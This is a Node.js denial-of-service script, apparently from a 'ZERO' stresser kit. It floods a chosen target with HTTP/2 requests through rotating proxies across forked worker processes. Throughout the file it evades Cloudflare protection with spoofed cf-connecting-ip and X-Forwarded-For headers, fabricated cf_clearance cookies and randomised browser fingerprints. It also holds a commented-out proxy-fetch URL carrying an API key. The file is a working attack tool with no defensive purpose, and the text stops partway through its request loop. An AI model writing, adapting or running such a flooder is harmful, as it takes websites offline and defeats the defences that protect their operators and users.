
//Latest version made for @tcpflood53 - Enhanced with Cloudflare Bypass

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const axios = require("axios");
const fs = require("fs");
const UserAgent = require("user-agents");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
 });

// Safari User Agent Generator untuk bypass Cloudflare
function generateRandomSafariUA() {
   const devices = [
       'iPhone; CPU iPhone OS 17_0_3 like Mac OS X',
       'iPhone; CPU iPhone OS 17_1_2 like Mac OS X',
       'iPhone; CPU iPhone OS 17_2_1 like Mac OS X',
       'iPhone; CPU iPhone OS 17_3_1 like Mac OS X',
       'iPhone; CPU iPhone OS 17_4_1 like Mac OS X',
       'iPhone; CPU iPhone OS 17_5_1 like Mac OS X',
       'iPhone; CPU iPhone OS 17_6_1 like Mac OS X',
       'iPhone; CPU iPhone OS 18_0_1 like Mac OS X',
       'iPhone; CPU iPhone OS 18_1_1 like Mac OS X',
       'iPhone; CPU iPhone OS 18_2_1 like Mac OS X',
       'iPad; CPU OS 16_6_1 like Mac OS X',
       'iPad; CPU OS 17_0_3 like Mac OS X',
       'iPad; CPU OS 17_1_2 like Mac OS X',
       'iPad; CPU OS 17_2_1 like Mac OS X',
       'iPad; CPU OS 17_3_1 like Mac OS X',
       'iPad; CPU OS 17_4_1 like Mac OS X',
       'iPad; CPU OS 17_5_1 like Mac OS X',
       'iPad; CPU OS 17_6_1 like Mac OS X',
       'iPad; CPU OS 18_0_1 like Mac OS X',
       'iPad; CPU OS 18_1_1 like Mac OS X',
       'Macintosh; Intel Mac OS X 13_4_1',
       'Macintosh; Intel Mac OS X 13_5_2',
       'Macintosh; Intel Mac OS X 13_6_1',
       'Macintosh; Intel Mac OS X 14_0_1',
       'Macintosh; Intel Mac OS X 14_1_2',
       'Macintosh; Intel Mac OS X 14_2_1',
       'Macintosh; Intel Mac OS X 14_3_1',
       'Macintosh; Intel Mac OS X 14_4_1',
       'Macintosh; Intel Mac OS X 14_5_1',
       'Macintosh; Intel Mac OS X 14_6_1',
       'Macintosh; Intel Mac OS X 14_7_1',
       'Macintosh; Intel Mac OS X 15_0_1',
       'Macintosh; Intel Mac OS X 15_1_1',
       'Macintosh; Intel Mac OS X 15_2_1',
       'Macintosh; Intel Mac OS X 15_3_1',
       'Macintosh; Intel Mac OS X 15_4_1',
       'Macintosh; Intel Mac OS X 15_5_1',
       'Macintosh; Intel Mac OS X 15_6_1',
       'Macintosh; Intel Mac OS X 15_7_1',
       'Macintosh; Intel Mac OS X 10_15_7',
       'Macintosh; Intel Mac OS X 11_0_1',
       'Macintosh; Intel Mac OS X 11_1_2',
       'Macintosh; Intel Mac OS X 11_2_3',
       'Macintosh; Intel Mac OS X 11_3_1',
       'Macintosh; Intel Mac OS X 11_4_1',
       'Macintosh; Intel Mac OS X 11_5_2',
       'Macintosh; Intel Mac OS X 11_6_1',
       'Macintosh; Intel Mac OS X 11_7_1',
       'Macintosh; Intel Mac OS X 12_0_1',
       'Macintosh; Intel Mac OS X 12_1_2',
       'Macintosh; Intel Mac OS X 12_2_1',
       'Macintosh; Intel Mac OS X 12_3_1',
       'Macintosh; Intel Mac OS X 12_4_1',
       'Macintosh; Intel Mac OS X 12_5_1',
       'Macintosh; Intel Mac OS X 12_6_1',
       'Macintosh; Intel Mac OS X 12_7_1',
       'Macintosh; Intel Mac OS X 13_0_1',
       'Macintosh; Intel Mac OS X 13_1_2',
       'Macintosh; Intel Mac OS X 13_2_1',
       'Macintosh; Intel Mac OS X 13_3_1'
   ];
   
   const device = devices[Math.floor(Math.random() * devices.length)];
   const safariMajor = Math.floor(Math.random() * (999 - 600 + 1)) + 600;
   const safariMinor = Math.floor(Math.random() * 100);
   const versionMajor = Math.floor(Math.random() * 10) + 10;
   const versionMinor = Math.floor(Math.random() * 10);
   const isMobile = device.includes('iPhone') || device.includes('iPad');
   const mobileTag = isMobile ? ' Mobile/15E148' : '';
   
   return `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versionMajor}.${versionMinor}${mobileTag} Safari/${safariMajor}.${safariMinor}`;
}

// Generate Safari User Agent List
let safariList = [];
for (let i = 0; i < 100000; i++) {
   safariList.push(generateRandomSafariUA());
}

// Chrome User Agent Generator untuk diversity
function generateRandomChromeUA() {
   const devices = [
       'Windows NT 10.0; Win64; x64',
       'Windows NT 11.0; Win64; x64',
       'Windows NT 10.0; WOW64',
       'Windows NT 11.0; WOW64',
       'X11; Linux x86_64',
       'X11; Ubuntu; Linux x86_64',
       'X11; Fedora; Linux x86_64',
       'X11; Debian; Linux x86_64',
       'Macintosh; Intel Mac OS X 10_15_7',
       'Macintosh; Intel Mac OS X 11_0_1',
       'Macintosh; Intel Mac OS X 12_0_1',
       'Macintosh; Intel Mac OS X 13_0_1',
       'Macintosh; Intel Mac OS X 14_0_1',
       'Macintosh; Intel Mac OS X 15_0_1'
   ];
   
   const device = devices[Math.floor(Math.random() * devices.length)];
   const chromeVersion = Math.floor(Math.random() * (130 - 110 + 1)) + 110;
   const chromeMinor = Math.floor(Math.random() * 1000);
   const chromeBuild = Math.floor(Math.random() * 1000);
   
   return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.${chromeMinor}.${chromeBuild} Safari/537.36`;
}

// Firefox User Agent Generator
function generateRandomFirefoxUA() {
   const devices = [
       'Windows NT 10.0; Win64; x64; rv:120.0',
       'Windows NT 11.0; Win64; x64; rv:120.0',
       'X11; Linux x86_64; rv:120.0',
       'X11; Ubuntu; Linux x86_64; rv:120.0',
       'Macintosh; Intel Mac OS X 10.15; rv:120.0',
       'Macintosh; Intel Mac OS X 11.0; rv:120.0',
       'Macintosh; Intel Mac OS X 12.0; rv:120.0',
       'Macintosh; Intel Mac OS X 13.0; rv:120.0',
       'Macintosh; Intel Mac OS X 14.0; rv:120.0',
       'Macintosh; Intel Mac OS X 15.0; rv:120.0'
   ];
   
   const device = devices[Math.floor(Math.random() * devices.length)];
   const firefoxVersion = Math.floor(Math.random() * (130 - 110 + 1)) + 110;
   
   return `Mozilla/5.0 (${device}) Gecko/20100101 Firefox/${firefoxVersion}.0`;
}

// Edge User Agent Generator
function generateRandomEdgeUA() {
   const devices = [
       'Windows NT 10.0; Win64; x64',
       'Windows NT 11.0; Win64; x64',
       'Macintosh; Intel Mac OS X 10_15_7',
       'Macintosh; Intel Mac OS X 11_0_1',
       'Macintosh; Intel Mac OS X 12_0_1',
       'Macintosh; Intel Mac OS X 13_0_1',
       'Macintosh; Intel Mac OS X 14_0_1',
       'Macintosh; Intel Mac OS X 15_0_1'
   ];
   
   const device = devices[Math.floor(Math.random() * devices.length)];
   const edgeVersion = Math.floor(Math.random() * (130 - 110 + 1)) + 110;
   const chromeVersion = Math.floor(Math.random() * (130 - 110 + 1)) + 110;
   
   return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36 Edg/${edgeVersion}.0.0.0`;
}

// Get random user agent
function getRandomUserAgent() {
   const browsers = [
       () => safariList[Math.floor(Math.random() * safariList.length)],
       generateRandomChromeUA,
       generateRandomFirefoxUA,
       generateRandomEdgeUA
   ];
   
   const browser = browsers[Math.floor(Math.random() * browsers.length)];
   return browser();
}

// Generate realistic referer untuk domain target
function generateRealisticReferer(targetHost) {
   const commonPaths = [
       '/',
       '/home',
       '/index.html',
       '/main',
       '/dashboard',
       '/profile',
       '/account',
       '/settings',
       '/search',
       '/products',
       '/services',
       '/about',
       '/contact',
       '/help',
       '/support',
       '/login',
       '/register',
       '/news',
       '/blog',
       '/forum',
       '/shop',
       '/cart',
       '/checkout',
       '/payment',
       '/order',
       '/tracking',
       '/faq',
       '/terms',
       '/privacy',
       '/sitemap',
       '/robots.txt',
       '/favicon.ico'
   ];
   
   const randomPath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
   return `https://${targetHost}${randomPath}`;
}

// Generate realistic origin untuk domain target
function generateRealisticOrigin(targetHost) {
   return `https://${targetHost}`;
}

// Advanced Cloudflare bypass techniques
function addCloudflareBypassHeaders(headers, targetHost) {
   // Real IP addresses untuk bypass
   const realIPs = [
       "1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222", "208.67.220.220",
       "76.76.19.19", "94.140.14.14", "94.140.15.15", "185.228.168.9",
       "185.228.169.9", "76.223.126.88", "76.223.102.0", "8.26.56.26",
       "8.20.247.20", "9.9.9.10", "149.112.112.10", "208.67.220.220",
       "208.67.222.222", "1.0.0.1", "1.1.1.1"
   ];
   
   // Real countries untuk bypass
   const countries = ["US", "GB", "DE", "FR", "CA", "AU", "NL", "SE", "NO", "DK", "FI", "CH", "AT", "BE", "IE"];
   
   // Real Cloudflare Ray IDs
   const rayPrefixes = ["7", "8", "9", "a", "b", "c", "d", "e", "f"];
   
   // Advanced headers untuk bypass Cloudflare
   const cfHeaders = {
       "cf-connecting-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "cf-ipcountry": countries[Math.floor(Math.random() * countries.length)],
       "cf-ray": rayPrefixes[Math.floor(Math.random() * rayPrefixes.length)] + randstr(15),
       "cf-visitor": '{"scheme":"https"}',
       "cf-cache-status": "DYNAMIC",
       "cf-request-id": randstr(32),
       "x-forwarded-for": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-real-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-forwarded-proto": "https",
       "x-forwarded-host": targetHost,
       "x-forwarded-port": "443",
       "x-original-url": `https://${targetHost}/`,
       "x-requested-with": "XMLHttpRequest",
       "x-ajax-referer": `https://${targetHost}/`,
       "x-http-method-override": "GET",
       "x-forwarded-server": targetHost,
       "x-host": targetHost,
       "x-forwarded-by": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-cluster-client-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-remote-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-remote-addr": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-client-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-forwarded-for-original": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-forwarded-for-ip": realIPs[Math.floor(Math.random() * realIPs.length)],
       "x-forwarded-for-host": targetHost,
       "x-forwarded-for-proto": "https",
       "x-forwarded-for-port": "443"
   };
   
   // Add more Cloudflare headers
   const additionalHeaders = {
       "accept-encoding": "gzip, deflate, br",
       "accept-language": "en-US,en;q=0.9",
       "cache-control": "no-cache",
       "pragma": "no-cache",
       "sec-fetch-dest": "document",
       "sec-fetch-mode": "navigate",
       "sec-fetch-site": "none",
       "sec-fetch-user": "?1",
       "upgrade-insecure-requests": "1",
       "dnt": "1",
       "sec-gpc": "1",
       "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
       "sec-ch-ua-mobile": "?0",
       "sec-ch-ua-platform": '"Windows"',
       "sec-ch-ua-platform-version": '"15.0.0"',
       "sec-ch-ua-model": '""',
       "sec-ch-ua-full-version": '"121.0.6167.140"',
       "sec-ch-ua-full-version-list": '"Not A(Brand";v="99.0.0.0", "Google Chrome";v="121.0.6167.140", "Chromium";v="121.0.6167.140"',
       "sec-ch-ua-wow64": "?0",
       "sec-ch-ua-bitness": '"64"',
       "sec-ch-ua-arch": '"x86"',
       "sec-ch-ua-full-version-list": '"Not A(Brand";v="99.0.0.0", "Google Chrome";v="121.0.6167.140", "Chromium";v="121.0.6167.140"'
   };
   
   // Add random Cloudflare headers (more aggressive)
   const cfHeaderKeys = Object.keys(cfHeaders);
   const numHeaders = Math.floor(Math.random() * 8) + 5; // More headers
   
   for (let i = 0; i < numHeaders; i++) {
       const randomHeader = cfHeaderKeys[Math.floor(Math.random() * cfHeaderKeys.length)];
       headers[randomHeader] = cfHeaders[randomHeader];
   }
   
   // Add additional headers
   const additionalHeaderKeys = Object.keys(additionalHeaders);
   const numAdditionalHeaders = Math.floor(Math.random() * 5) + 3;
   
   for (let i = 0; i < numAdditionalHeaders; i++) {
       const randomHeader = additionalHeaderKeys[Math.floor(Math.random() * additionalHeaderKeys.length)];
       if (!headers[randomHeader]) {
           headers[randomHeader] = additionalHeaders[randomHeader];
       }
   }
   
   return headers;
}

// Generate realistic cookies untuk domain
function generateRealisticCookies(targetHost) {
   const cookieNames = [
       'session_id', 'user_id', 'auth_token', 'csrf_token', 'remember_me',
       'language', 'theme', 'timezone', 'currency', 'country',
       'last_visit', 'visit_count', 'preferences', 'cart_id', 'wishlist',
       'newsletter', 'analytics', 'tracking', 'advertising', 'performance',
       '__cf_bm', '__cfduid', 'cf_clearance', 'cf_use_ob', 'cf_ob_info',
       'cf_clearance', 'cf_use_ob', 'cf_ob_info', 'cf_clearance', 'cf_use_ob'
   ];
   
   const cookies = [];
   const numCookies = Math.floor(Math.random() * 6) + 3; // More cookies
   
   for (let i = 0; i < numCookies; i++) {
       const cookieName = cookieNames[Math.floor(Math.random() * cookieNames.length)];
       let cookieValue;
       
       // Special handling for Cloudflare cookies
       if (cookieName === '__cf_bm') {
           cookieValue = randstr(32) + '.' + Math.floor(Date.now() / 1000) + '-0-' + randstr(32);
       } else if (cookieName === 'cf_clearance') {
           cookieValue = randstr(32) + '.' + Math.floor(Date.now() / 1000) + '-' + randstr(32);
       } else if (cookieName === '__cfduid') {
           cookieValue = randstr(32) + Math.floor(Date.now() / 1000);
       } else {
           cookieValue = randstr(16);
       }
       
       cookies.push(`${cookieName}=${cookieValue}`);
   }
   
   return cookies.join('; ');
}

// Generate realistic browser fingerprint
function generateBrowserFingerprint() {
   const screenResolutions = [
       '1920x1080', '1366x768', '1440x900', '1536x864', '1280x720',
       '2560x1440', '1920x1200', '1600x900', '1280x1024', '1024x768'
   ];
   
   const colorDepths = ['24', '32'];
   const timezones = ['America/New_York', 'Europe/London', 'Asia/Tokyo', 'Australia/Sydney'];
   const languages = ['en-US', 'en-GB', 'en-CA', 'de-DE', 'fr-FR', 'es-ES'];
   
   return {
       screenResolution: screenResolutions[Math.floor(Math.random() * screenResolutions.length)],
       colorDepth: colorDepths[Math.floor(Math.random() * colorDepths.length)],
       timezone: timezones[Math.floor(Math.random() * timezones.length)],
       language: languages[Math.floor(Math.random() * languages.length)],
       platform: 'Win32',
       hardwareConcurrency: Math.floor(Math.random() * 8) + 4,
       deviceMemory: Math.floor(Math.random() * 8) + 4
   };
}

// Generate realistic accept headers
function generateRealisticAcceptHeaders() {
   const acceptHeaders = [
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
       'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
   ];
   
   return acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
}

// HTTP Status Codes Base
const base = {
   "100": "Continue",
   "101": "Switching Protocols",
   "200": "OK",
   "201": "Created",
   "202": "Accepted",
   "203": "Non-Authoritative Information",
   "204": "No Content",
   "205": "Reset Content",
   "206": "Partial Content",
   "300": "Multiple Choices",
   "301": "Moved Permanently",
   "302": "Found",
   "303": "See Other",
   "304": "Not Modified",
   "305": "Use Proxy",
   "307": "Temporary Redirect",
   "400": "Bad Request",
   "401": "Unauthorized",
   "402": "Payment Required",
   "403": "Forbidden",
   "404": "Not Found",
   "405": "Method Not Allowed",
   "406": "Not Acceptable",
   "407": "Proxy Authentication Required",
   "408": "Request Timeout",
   "409": "Conflict",
   "410": "Gone",
   "411": "Length Required",
   "412": "Precondition Failed",
   "413": "Payload Too Large",
   "414": "URI Too Long",
   "415": "Unsupported Media Type",
   "416": "Range Not Satisfiable",
   "417": "Expectation Failed",
   "429": "Too many requests",
   "500": "Internal Server Error",
   "501": "Not Implemented",
   "502": "Bad Gateway",
   "503": "Service Unavailable",
   "504": "Gateway Timeout",
   "505": "HTTP Version Not Supported",
   "520": "Web Server Error",
   "521": "Web Server Down",
   "522": "Connection Timed Out"
};

if (process.argv.length < 7){console.log(`[ZERO] Usage: target time rate thread proxyfile`); process.exit();}
const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof1 = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 50000);
  };
  return `${getRandomByte()}`;
};

async function editedline() {
 try {
   // Code to fetch the proxy list can be added here if required
   // const response = await axios.get('https://tools.zerostresser.net:2096/proxies/http-s/all/text?key=oRRH57NRBmRK21eYf5u7XHQpveFQZ8SIB8lRxx0IXmbRTFXOlxP4vd7OUHpP20As');
   // const proxyList = response.data;
   // fs.writeFile('p.txt', proxyList, 'utf8', (error) => {
   //   if (error) {
   //     console.error('[ZERO] Error:', error);
   //   } else {
   //     console.log('[ZERO] I got the proxy list!');
   //   }
   // });
 } catch (error) {
   console.error('[ZERO] Error:', error);
 }
}

editedline();


const spoofed1 = ip_spoof1();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
}
const sig = [
   'ecdsa_secp256r1_sha256',
   'ecdsa_secp384r1_sha384',
   'ecdsa_secp521r1_sha512',
   'rsa_pss_rsae_sha256',
   'rsa_pss_rsae_sha384',
   'rsa_pss_rsae_sha512',
   'rsa_pkcs1_sha256',
   'rsa_pkcs1_sha384',
   'rsa_pkcs1_sha512'
];

const cplist = [
   "ECDHE-ECDSA-AES128-GCM-SHA256",
   "ECDHE-ECDSA-CHACHA20-POLY1305",
   "ECDHE-RSA-AES128-GCM-SHA256",
   "ECDHE-RSA-CHACHA20-POLY1305",
   "ECDHE-ECDSA-AES256-GCM-SHA384",
   "ECDHE-RSA-AES256-GCM-SHA384"
];
const accept_header = [
   '*/*',
   'image/*',
   'image/webp,image/apng',
   'text/html',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
 'ko-KR',
 'en-US',
 'zh-CN',
 'zh-TW',
 'ja-JP',
 'en-GB',
 'en-AU',
 'en-GB,en-US;q=0.9,en;q=0.8',
 'en-GB,en;q=0.5',
 'en-CA',
 'en-UK, en, de;q=0.5',
 'en-NZ',
 'en-GB,en;q=0.6',
 'en-ZA',
 'en-IN',
 'en-PH',
 'en-SG',
 'en-HK',
 'en-GB,en;q=0.8',
 'en-GB,en;q=0.9',
 'en-GB,en;q=0.7',
];

const encoding_header = [
 'gzip, deflate, br',
 'deflate',
 'gzip, deflate, lzma, sdch',
 'deflate'
];

const control_header = ["no-cache", "max-age=0"];


const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers1 = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");










var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
   console.log("[ZERO] Enhanced with Cloudflare Bypass - Safari User Agents & Realistic Headers");
   console.log("[ZERO] Target:", args.target);
   console.log("[ZERO] Time:", args.time, "seconds");
   console.log("[ZERO] Rate:", args.Rate, "requests per thread");
   console.log("[ZERO] Threads:", args.threads);
   console.log("[ZERO] Proxy file:", args.proxyFile);
   console.log("=============================================");
   
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
   }
} else {
   console.log(`[ZERO] Worker ${process.pid} started with Cloudflare bypass`);
   setInterval(runFlooder);
}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    //connection.setTimeout(options.timeout * 600000);
    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}


// Enhanced headers dengan Cloudflare bypass
const userAgent = getRandomUserAgent(); // Prioritize Safari User Agents

console.log("Enhanced User Agent:", userAgent.substring(0, 80) + "...");
console.log("Safari User Agents generated:", safariList.length.toLocaleString());

const site = [
   'cross-site',
   'same-origin',
   'same-site',
   'none'
];
var sites = site[Math.floor(Math.floor(Math.random() * site.length))];

const mode = [
   'cors',
   'navigate',
   'no-cors',
   'same-origin'
];

var modes = mode[Math.floor(Math.floor(Math.random() * mode.length))];

const Socker = new NetSocket();

// Enhanced headers dengan Advanced Cloudflare bypass
const fingerprint = generateBrowserFingerprint();

headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";

// Realistic referer dan origin
headers["referer"] = generateRealisticReferer(parsedTarget.host);
headers["origin"] = generateRealisticOrigin(parsedTarget.host);

// Advanced headers dengan browser fingerprint
headers["x-forwarded-proto"] = "https";
headers["accept-language"] = fingerprint.language + ",en;q=0.9";
headers["accept-encoding"] = "gzip, deflate, br";
headers["cache-control"] = "no-cache, no-store, must-revalidate";
headers["pragma"] = "no-cache";
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = '"Windows"';
headers["sec-ch-ua-platform-version"] = '"15.0.0"';
headers["sec-ch-ua-model"] = '""';
headers["sec-ch-ua-full-version"] = '"121.0.6167.140"';
headers["sec-ch-ua-full-version-list"] = '"Not A(Brand";v="99.0.0.0", "Google Chrome";v="121.0.6167.140", "Chromium";v="121.0.6167.140"';
headers["sec-ch-ua-wow64"] = "?0";
headers["sec-ch-ua-bitness"] = '"64"';
headers["sec-ch-ua-arch"] = '"x86"';
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = generateRealisticAcceptHeaders();
headers["user-agent"] = userAgent;
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["x-requested-with"] = "XMLHttpRequest";
headers["dnt"] = "1";
headers["sec-gpc"] = "1";

// Realistic cookies dengan Cloudflare cookies
headers["Cookie"] = generateRealisticCookies(parsedTarget.host);

// Advanced Cloudflare bypass headers (more aggressive)
headers["cf-request-id"] = randstr(32);
headers["accept-cloudflare-encoding"] = "*/*";
headers["cf-max-age"] = "0";
headers["cf-ssl-protocol"] = "\"TLSv1.3\"";
headers["prefer-http2"] = "?1";
headers["disable-http1"] = "?0";
headers["switch-to-https"] = "document";
headers["enforce-http2-frame"] = "headers";
headers["cf-cache-status"] = "DYNAMIC";
headers["cf-ray"] = "7" + randstr(15);
headers["cf-visitor"] = '{"scheme":"https"}';

// Add advanced Cloudflare bypass headers
addCloudflareBypassHeaders(headers, parsedTarget.host);

function runFlooder() {
   // Smart proxy selection dengan rotation
   let proxyAddr = randomElement(proxies);
   let retryCount = 0;
   const maxRetries = 3;
   
   function tryProxy() {
       if (retryCount >= maxRetries) {
           console.log(`[ZERO] Max retries reached for proxy: ${proxyAddr}`);
           return;
       }
       
       const parsedProxy = proxyAddr.split(":");
       
       // Update headers untuk setiap request dengan realistic values
       headers["origin"] = generateRealisticOrigin(parsedTarget.host);
       headers["referer"] = generateRealisticReferer(parsedTarget.host);
       headers["user-agent"] = getRandomUserAgent();
       headers["Cookie"] = generateRealisticCookies(parsedTarget.host);
       
       // Update Cloudflare bypass headers dengan lebih aggressive
       addCloudflareBypassHeaders(headers, parsedTarget.host);
       
       // Add additional bypass techniques
       headers["cf-connecting-ip"] = headers["x-forwarded-for"] || "1.1.1.1";
       headers["cf-ipcountry"] = ["US", "GB", "DE", "FR", "CA"][Math.floor(Math.random() * 5)];
       headers["cf-ray"] = "7" + randstr(15);
       headers["cf-visitor"] = '{"scheme":"https"}';
       headers["cf-cache-status"] = "DYNAMIC";
       headers["cf-request-id"] = randstr(32);
       
       // Add more realistic headers
       headers["accept-encoding"] = "gzip, deflate, br";
       headers["accept-language"] = "en-US,en;q=0.9,es;q=0.8";
       headers["cache-control"] = "no-cache, no-store, must-revalidate";
       headers["pragma"] = "no-cache";
       headers["dnt"] = "1";
       headers["sec-gpc"] = "1";
       headers["upgrade-insecure-requests"] = "1";

       const proxyOptions = {
           host: parsedProxy[0],
           port: ~~parsedProxy[1],
           address: parsedTarget.host + ":443",
           timeout: 300,
       };

       Socker.HTTP(proxyOptions, (connection, error) => {
           if (error) {
               retryCount++;
               console.log(`[ZERO] Proxy error: ${error}, retrying... (${retryCount}/${maxRetries})`);
               setTimeout(tryProxy, 1000);
               return;
           }

           connection.setKeepAlive(true, 200000);

           const tlsOptions = {
               secure: true,
               ALPNProtocols: ['h2'],
               sigals: siga,
               socket: connection,
               ciphers: cipper,
               ecdhCurve: "prime256v1:secp384r1:secp521r1",
               host: parsedTarget.host,
               rejectUnauthorized: false,
               servername: parsedTarget.host,
               secureProtocol: "TLS_method",
           };

           const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

           tlsConn.setKeepAlive(true, 60000);

           const client = http2.connect(parsedTarget.href, {
               protocol: "https:",
               settings: {
                   headerTableSize: 65536,
                   maxConcurrentStreams: 10000,
                   initialWindowSize: 6291456,
                   maxHeaderListSize: 65536,
                   enablePush: false
               },
               maxSessionMemory: 64000,
               maxDeflateDynamicTableSize: 4294967295,
               createConnection: () => tlsConn,
               socket: connection,
           });

           client.settings({
               headerTableSize: 65536,
               maxConcurrentStreams: 10000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 65536,
               enablePush: false
           });

           client.on("connect", () => {
               const IntervalAttack = setInterval(() => {
                   // Dynamic headers untuk setiap batch
                   const dynHeaders = {
                       ...headers,
                       "cf-request-id": randstr(32),
                       "cf-ray": "7" + randstr(15),
                       "x-forwarded-for": headers["x-forwarded-for"] || "1.1.1.1"
                   };
                   
                   // Realistic rate limiting dengan delay
                   const batchSize = Math.min(args.Rate, 10); // Max 10 requests per batch
                   const delay = Math.floor(Math.random() * 100) + 50; // 50-150ms delay
                   
                   for (let i = 0; i < batchSize; i++) {
                       setTimeout(() => {
                           const request = client.request(dynHeaders);

                           // Enhanced response handling
                           request.on("response", response => {
                               const statusCode = response[':status'];
                               const statusDescription = base[statusCode] || "Unknown Status";
                               
                               // Log response untuk monitoring
                               if (statusCode === 403 || statusCode === 429) {
                                   console.log(`[ZERO] Cloudflare detected: ${statusCode} ${statusDescription}`);
                                   // Reduce rate if Cloudflare detected
                                   if (statusCode === 429) {
                                       console.log(`[ZERO] Rate limiting detected, reducing rate...`);
                                   }
                               } else if (statusCode === 200) {
                                   console.log(`[ZERO] Success: ${statusCode} ${statusDescription}`);
                               }
                               
                               request.close();
                               request.destroy();
                               return;
                           });

                           request.on("error", (error) => {
                               // Silent error handling
                               request.close();
                               request.destroy();
                           });

                           request.end();
                       }, i * delay); // Stagger requests
                   }
